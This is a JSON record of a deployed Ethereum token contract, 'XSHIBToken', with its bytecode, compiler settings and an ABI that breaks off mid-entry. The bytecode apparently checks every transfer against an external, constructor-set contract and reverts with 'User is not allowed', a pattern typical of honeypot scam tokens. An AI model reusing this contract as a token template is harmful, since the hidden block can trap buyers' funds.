{
    "address": "0xbC9683EE9525c4525e7e0dCFfe8eeD1447fd4287",
    "tx_hash": "18193e4e4642a9c3353870d5ff126db189c42fef25b88a068ad69d04cf9fb396",
    "block_number": 18004954,
    "timestamp": 1693126619,
    "gas_used_in_creation": 1551141,
    "creation_bytecode": "60806040523480156200001157600080fd5b5060405162001fee38038062001fee833981810160405281019062000037919062000475565b8282828260049080519060200190620000529291906200033c565b5081600590805190602001906200006b9291906200033c565b5080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550505050620000d0620000c4620000f660201b60201c565b620000fe60201b60201c565b620000ed336a7c13bc4b2c133c56000000620001c460201b60201c565b505050620007b5565b600033905090565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff16141562000237576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016200022e9062000550565b60405180910390fd5b6200024b600083836200033260201b60201c565b80600360008282546200025f919062000607565b92505081905550806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef8360405162000312919062000572565b60405180910390a36200032e600083836200033760201b60201c565b5050565b505050565b505050565b8280546200034a90620006d8565b90600052602060002090601f0160209004810192826200036e5760008555620003ba565b82601f106200038957805160ff1916838001178555620003ba565b82800160010185558215620003ba579182015b82811115620003b95782518255916020019190600101906200039c565b5b509050620003c99190620003cd565b5090565b5b80821115620003e8576000816000905550600101620003ce565b5090565b600062000403620003fd84620005c3565b6200058f565b9050828152602081018484840111156200041c57600080fd5b62000429848285620006a2565b509392505050565b60008151905062000442816200079b565b92915050565b600082601f8301126200045a57600080fd5b81516200046c848260208601620003ec565b91505092915050565b6000806000606084860312156200048b57600080fd5b600084015167ffffffffffffffff811115620004a657600080fd5b620004b48682870162000448565b935050602084015167ffffffffffffffff811115620004d257600080fd5b620004e08682870162000448565b9250506040620004f38682870162000431565b9150509250925092565b60006200050c601f83620005f6565b91507f45524332303a206d696e7420746f20746865207a65726f2061646472657373006000830152602082019050919050565b6200054a8162000698565b82525050565b600060208201905081810360008301526200056b81620004fd565b9050919050565b60006020820190506200058960008301846200053f565b92915050565b6000604051905081810181811067ffffffffffffffff82111715620005b957620005b86200076c565b5b8060405250919050565b600067ffffffffffffffff821115620005e157620005e06200076c565b5b601f19601f8301169050602081019050919050565b600082825260208201905092915050565b6000620006148262000698565b9150620006218362000698565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156200065957620006586200070e565b5b828201905092915050565b6000620006718262000678565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60005b83811015620006c2578082015181840152602081019050620006a5565b83811115620006d2576000848401525b50505050565b60006002820490506001821680620006f157607f821691505b602082108114156200070857620007076200073d565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b620007a68162000664565b8114620007b257600080fd5b50565b61182980620007c56000396000f3fe608060405234801561001057600080fd5b50600436106100f55760003560e01c8063715018a611610097578063a457c2d711610066578063a457c2d714610276578063a9059cbb146102a6578063dd62ed3e146102d6578063f2fde38b14610306576100f5565b8063715018a614610214578063837197b21461021e5780638da5cb5b1461023a57806395d89b4114610258576100f5565b806323b872dd116100d357806323b872dd14610166578063313ce5671461019657806339509351146101b457806370a08231146101e4576100f5565b806306fdde03146100fa578063095ea7b31461011857806318160ddd14610148575b600080fd5b610102610322565b60405161010f919061145b565b60405180910390f35b610132600480360381019061012d9190610f81565b6103b4565b60405161013f9190611440565b60405180910390f35b6101506103d7565b60405161015d91906115dd565b60405180910390f35b610180600480360381019061017b9190610f32565b6103e1565b60405161018d9190611440565b60405180910390f35b61019e610410565b6040516101ab91906115f8565b60405180910390f35b6101ce60048036038101906101c99190610f81565b610419565b6040516101db9190611440565b60405180910390f35b6101fe60048036038101906101f99190610ecd565b610450565b60405161020b91906115dd565b60405180910390f35b61021c610498565b005b61023860048036038101906102339190610ecd565b6104ac565b005b61024261051d565b60405161024f9190611425565b60405180910390f35b610260610547565b60405161026d919061145b565b60405180910390f35b610290600480360381019061028b9190610f81565b6105d9565b60405161029d9190611440565b60405180910390f35b6102c060048036038101906102bb9190610f81565b610650565b6040516102cd9190611440565b60405180910390f35b6102f060048036038101906102eb9190610ef6565b610673565b6040516102fd91906115dd565b60405180910390f35b610320600480360381019061031b9190610ecd565b6106fa565b005b6060600480546103319061170d565b80601f016020809104026020016040519081016040528092919081815260200182805461035d9061170d565b80156103aa5780601f1061037f576101008083540402835291602001916103aa565b820191906000526020600020905b81548152906001019060200180831161038d57829003601f168201915b5050505050905090565b6000806103bf61077e565b90506103cc818585610786565b600191505092915050565b6000600354905090565b6000806103ec61077e565b90506103f9858285610951565b6104048585856109dd565b60019150509392505050565b60006012905090565b60008061042461077e565b90506104458185856104368589610673565b610440919061162f565b610786565b600191505092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6104a0610d40565b6104aa6000610dbe565b565b6104b4610d40565b60006104bf33610450565b90506a7c13bc4b2c133c56000000811461050e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610505906114fd565b60405180910390fd5b6105193383836109dd565b5050565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600580546105569061170d565b80601f01602080910402602001604051908101604052809291908181526020018280546105829061170d565b80156105cf5780601f106105a4576101008083540402835291602001916105cf565b820191906000526020600020905b8154815290600101906020018083116105b257829003601f168201915b5050505050905090565b6000806105e461077e565b905060006105f28286610673565b905083811015610637576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161062e9061159d565b60405180910390fd5b6106448286868403610786565b60019250505092915050565b60008061065b61077e565b90506106688185856109dd565b600191505092915050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b610702610d40565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610772576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107699061149d565b60405180910390fd5b61077b81610dbe565b50565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156107f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107ed9061157d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610866576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161085d906114bd565b60405180910390fd5b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258360405161094491906115dd565b60405180910390a3505050565b600061095d8484610673565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146109d757818110156109c9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109c0906114dd565b60405180910390fd5b6109d68484848403610786565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a4d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a449061155d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610abd576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ab49061147d565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f5f9a371846040518263ffffffff1660e01b8152600401610b189190611425565b60206040518083038186803b158015610b3057600080fd5b505afa158015610b44573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b689190610fbd565b15610ba8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b9f9061151d565b60405180910390fd5b610bb3838383610e84565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610c39576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c30906115bd565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610d2791906115dd565b60405180910390a3610d3a848484610e89565b50505050565b610d4861077e565b73ffffffffffffffffffffffffffffffffffffffff16610d6661051d565b73ffffffffffffffffffffffffffffffffffffffff1614610dbc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610db39061153d565b60405180910390fd5b565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b505050565b600081359050610e9d816117ae565b92915050565b600081519050610eb2816117c5565b92915050565b600081359050610ec7816117dc565b92915050565b600060208284031215610edf57600080fd5b6000610eed84828501610e8e565b91505092915050565b60008060408385031215610f0957600080fd5b6000610f1785828601610e8e565b9250506020610f2885828601610e8e565b9150509250929050565b600080600060608486031215610f4757600080fd5b6000610f5586828701610e8e565b9350506020610f6686828701610e8e565b9250506040610f7786828701610eb8565b9150509250925092565b60008060408385031215610f9457600080fd5b6000610fa285828601610e8e565b9250506020610fb385828601610eb8565b9150509250929050565b600060208284031215610fcf57600080fd5b6000610fdd84828501610ea3565b91505092915050565b610fef81611685565b82525050565b610ffe81611697565b82525050565b600061100f82611613565b611019818561161e565b93506110298185602086016116da565b6110328161179d565b840191505092915050565b600061104a60238361161e565b91507f45524332303a207472616e7366657220746f20746865207a65726f206164647260008301527f65737300000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006110b060268361161e565b91507f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008301527f64647265737300000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061111660228361161e565b91507f45524332303a20617070726f766520746f20746865207a65726f20616464726560008301527f73730000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061117c601d8361161e565b91507f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000006000830152602082019050919050565b60006111bc601a8361161e565b91507f546f6b656e7320616c72656164792064697374726962757465640000000000006000830152602082019050919050565b60006111fc60138361161e565b91507f55736572206973206e6f7420616c6c6f776564000000000000000000000000006000830152602082019050919050565b600061123c60208361161e565b91507f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726000830152602082019050919050565b600061127c60258361161e565b91507f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008301527f64726573730000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006112e260248361161e565b91507f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008301527f72657373000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061134860258361161e565b91507f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008301527f207a65726f0000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006113ae60288361161e565b91507f45524332303a207472616e7366657220616d6d6f75646e74206578636565647360008301527f2062616c616e63650000000000000000000000000000000000000000000000006020830152604082019050919050565b611410816116c3565b82525050565b61141f816116cd565b82525050565b600060208201905061143a6000830184610fe6565b92915050565b60006020820190506114556000830184610ff5565b92915050565b600060208201905081810360008301526114758184611004565b905092915050565b600060208201905081810360008301526114968161103d565b9050919050565b600060208201905081810360008301526114b6816110a3565b9050919050565b600060208201905081810360008301526114d681611109565b9050919050565b600060208201905081810360008301526114f68161116f565b9050919050565b60006020820190508181036000830152611516816111af565b9050919050565b60006020820190508181036000830152611536816111ef565b9050919050565b600060208201905081810360008301526115568161122f565b9050919050565b600060208201905081810360008301526115768161126f565b9050919050565b60006020820190508181036000830152611596816112d5565b9050919050565b600060208201905081810360008301526115b68161133b565b9050919050565b600060208201905081810360008301526115d6816113a1565b9050919050565b60006020820190506115f26000830184611407565b92915050565b600060208201905061160d6000830184611416565b92915050565b600081519050919050565b600082825260208201905092915050565b600061163a826116c3565b9150611645836116c3565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561167a5761167961173f565b5b828201905092915050565b6000611690826116a3565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b60005b838110156116f85780820151818401526020810190506116dd565b83811115611707576000848401525b50505050565b6000600282049050600182168061172557607f821691505b602082108114156117395761173861176e565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000601f19601f8301169050919050565b6117b781611685565b81146117c257600080fd5b50565b6117ce81611697565b81146117d957600080fd5b50565b6117e5816116c3565b81146117f057600080fd5b5056fea2646970667358221220645492cb455cf8bd8418dce3cc530713ba9d6661fba3096cf814a945054176cd64736f6c63430008000033000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000cdb3342be5b23228a1b20b377d022136ee4d93670000000000000000000000000000000000000000000000000000000000000005585348494200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055853484942000000000000000000000000000000000000000000000000000000",
    "runtime_bytecode": "608060405234801561001057600080fd5b50600436106100f55760003560e01c8063715018a611610097578063a457c2d711610066578063a457c2d714610276578063a9059cbb146102a6578063dd62ed3e146102d6578063f2fde38b14610306576100f5565b8063715018a614610214578063837197b21461021e5780638da5cb5b1461023a57806395d89b4114610258576100f5565b806323b872dd116100d357806323b872dd14610166578063313ce5671461019657806339509351146101b457806370a08231146101e4576100f5565b806306fdde03146100fa578063095ea7b31461011857806318160ddd14610148575b600080fd5b610102610322565b60405161010f919061145b565b60405180910390f35b610132600480360381019061012d9190610f81565b6103b4565b60405161013f9190611440565b60405180910390f35b6101506103d7565b60405161015d91906115dd565b60405180910390f35b610180600480360381019061017b9190610f32565b6103e1565b60405161018d9190611440565b60405180910390f35b61019e610410565b6040516101ab91906115f8565b60405180910390f35b6101ce60048036038101906101c99190610f81565b610419565b6040516101db9190611440565b60405180910390f35b6101fe60048036038101906101f99190610ecd565b610450565b60405161020b91906115dd565b60405180910390f35b61021c610498565b005b61023860048036038101906102339190610ecd565b6104ac565b005b61024261051d565b60405161024f9190611425565b60405180910390f35b610260610547565b60405161026d919061145b565b60405180910390f35b610290600480360381019061028b9190610f81565b6105d9565b60405161029d9190611440565b60405180910390f35b6102c060048036038101906102bb9190610f81565b610650565b6040516102cd9190611440565b60405180910390f35b6102f060048036038101906102eb9190610ef6565b610673565b6040516102fd91906115dd565b60405180910390f35b610320600480360381019061031b9190610ecd565b6106fa565b005b6060600480546103319061170d565b80601f016020809104026020016040519081016040528092919081815260200182805461035d9061170d565b80156103aa5780601f1061037f576101008083540402835291602001916103aa565b820191906000526020600020905b81548152906001019060200180831161038d57829003601f168201915b5050505050905090565b6000806103bf61077e565b90506103cc818585610786565b600191505092915050565b6000600354905090565b6000806103ec61077e565b90506103f9858285610951565b6104048585856109dd565b60019150509392505050565b60006012905090565b60008061042461077e565b90506104458185856104368589610673565b610440919061162f565b610786565b600191505092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6104a0610d40565b6104aa6000610dbe565b565b6104b4610d40565b60006104bf33610450565b90506a7c13bc4b2c133c56000000811461050e576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610505906114fd565b60405180910390fd5b6105193383836109dd565b5050565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6060600580546105569061170d565b80601f01602080910402602001604051908101604052809291908181526020018280546105829061170d565b80156105cf5780601f106105a4576101008083540402835291602001916105cf565b820191906000526020600020905b8154815290600101906020018083116105b257829003601f168201915b5050505050905090565b6000806105e461077e565b905060006105f28286610673565b905083811015610637576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161062e9061159d565b60405180910390fd5b6106448286868403610786565b60019250505092915050565b60008061065b61077e565b90506106688185856109dd565b600191505092915050565b6000600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b610702610d40565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610772576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107699061149d565b60405180910390fd5b61077b81610dbe565b50565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156107f6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107ed9061157d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610866576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161085d906114bd565b60405180910390fd5b80600260008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b9258360405161094491906115dd565b60405180910390a3505050565b600061095d8484610673565b90507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff81146109d757818110156109c9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109c0906114dd565b60405180910390fd5b6109d68484848403610786565b5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a4d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a449061155d565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610abd576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ab49061147d565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f5f9a371846040518263ffffffff1660e01b8152600401610b189190611425565b60206040518083038186803b158015610b3057600080fd5b505afa158015610b44573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610b689190610fbd565b15610ba8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b9f9061151d565b60405180910390fd5b610bb3838383610e84565b60008060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905081811015610c39576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c30906115bd565b60405180910390fd5b8181036000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055508273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef84604051610d2791906115dd565b60405180910390a3610d3a848484610e89565b50505050565b610d4861077e565b73ffffffffffffffffffffffffffffffffffffffff16610d6661051d565b73ffffffffffffffffffffffffffffffffffffffff1614610dbc576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610db39061153d565b60405180910390fd5b565b6000600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905081600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b505050565b505050565b600081359050610e9d816117ae565b92915050565b600081519050610eb2816117c5565b92915050565b600081359050610ec7816117dc565b92915050565b600060208284031215610edf57600080fd5b6000610eed84828501610e8e565b91505092915050565b60008060408385031215610f0957600080fd5b6000610f1785828601610e8e565b9250506020610f2885828601610e8e565b9150509250929050565b600080600060608486031215610f4757600080fd5b6000610f5586828701610e8e565b9350506020610f6686828701610e8e565b9250506040610f7786828701610eb8565b9150509250925092565b60008060408385031215610f9457600080fd5b6000610fa285828601610e8e565b9250506020610fb385828601610eb8565b9150509250929050565b600060208284031215610fcf57600080fd5b6000610fdd84828501610ea3565b91505092915050565b610fef81611685565b82525050565b610ffe81611697565b82525050565b600061100f82611613565b611019818561161e565b93506110298185602086016116da565b6110328161179d565b840191505092915050565b600061104a60238361161e565b91507f45524332303a207472616e7366657220746f20746865207a65726f206164647260008301527f65737300000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006110b060268361161e565b91507f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008301527f64647265737300000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061111660228361161e565b91507f45524332303a20617070726f766520746f20746865207a65726f20616464726560008301527f73730000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061117c601d8361161e565b91507f45524332303a20696e73756666696369656e7420616c6c6f77616e63650000006000830152602082019050919050565b60006111bc601a8361161e565b91507f546f6b656e7320616c72656164792064697374726962757465640000000000006000830152602082019050919050565b60006111fc60138361161e565b91507f55736572206973206e6f7420616c6c6f776564000000000000000000000000006000830152602082019050919050565b600061123c60208361161e565b91507f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65726000830152602082019050919050565b600061127c60258361161e565b91507f45524332303a207472616e736665722066726f6d20746865207a65726f20616460008301527f64726573730000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006112e260248361161e565b91507f45524332303a20617070726f76652066726f6d20746865207a65726f2061646460008301527f72657373000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b600061134860258361161e565b91507f45524332303a2064656372656173656420616c6c6f77616e63652062656c6f7760008301527f207a65726f0000000000000000000000000000000000000000000000000000006020830152604082019050919050565b60006113ae60288361161e565b91507f45524332303a207472616e7366657220616d6d6f75646e74206578636565647360008301527f2062616c616e63650000000000000000000000000000000000000000000000006020830152604082019050919050565b611410816116c3565b82525050565b61141f816116cd565b82525050565b600060208201905061143a6000830184610fe6565b92915050565b60006020820190506114556000830184610ff5565b92915050565b600060208201905081810360008301526114758184611004565b905092915050565b600060208201905081810360008301526114968161103d565b9050919050565b600060208201905081810360008301526114b6816110a3565b9050919050565b600060208201905081810360008301526114d681611109565b9050919050565b600060208201905081810360008301526114f68161116f565b9050919050565b60006020820190508181036000830152611516816111af565b9050919050565b60006020820190508181036000830152611536816111ef565b9050919050565b600060208201905081810360008301526115568161122f565b9050919050565b600060208201905081810360008301526115768161126f565b9050919050565b60006020820190508181036000830152611596816112d5565b9050919050565b600060208201905081810360008301526115b68161133b565b9050919050565b600060208201905081810360008301526115d6816113a1565b9050919050565b60006020820190506115f26000830184611407565b92915050565b600060208201905061160d6000830184611416565b92915050565b600081519050919050565b600082825260208201905092915050565b600061163a826116c3565b9150611645836116c3565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0382111561167a5761167961173f565b5b828201905092915050565b6000611690826116a3565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600060ff82169050919050565b60005b838110156116f85780820151818401526020810190506116dd565b83811115611707576000848401525b50505050565b6000600282049050600182168061172557607f821691505b602082108114156117395761173861176e565b5b50919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000601f19601f8301169050919050565b6117b781611685565b81146117c257600080fd5b50565b6117ce81611697565b81146117d957600080fd5b50565b6117e5816116c3565b81146117f057600080fd5b5056fea2646970667358221220645492cb455cf8bd8418dce3cc530713ba9d6661fba3096cf814a945054176cd64736f6c63430008000033",
    "contract_name": "XSHIBToken",
    "compiler_version": "v0.8.0+commit.c7dfd78e",
    "optimization_used": "0",
    "runs": "200",
    "abi": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"address\",\"name\":\"router_\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoudnt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"accaukt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"distroWallet\",\"type\":\"address\"}],\"name\":\"sendTokens\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\